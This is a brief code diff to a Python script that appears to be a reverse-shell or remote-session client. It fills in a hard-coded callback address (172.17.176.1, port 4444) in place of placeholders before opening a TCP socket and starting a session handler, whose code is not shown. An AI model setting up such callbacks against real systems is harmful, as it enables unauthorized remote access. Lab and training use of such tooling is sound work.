@@ -62,8 +62,8 @@ def session_handler():
 
 if __name__ == "__main__":
     try:
-        HOST_IP = 'INPUT_IP_HERE'
-        HOST_PORT = INPUT_PORT_HERE
+        HOST_IP = '172.17.176.1'
+        HOST_PORT = 4444
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         session_handler()
     except Exception as error:
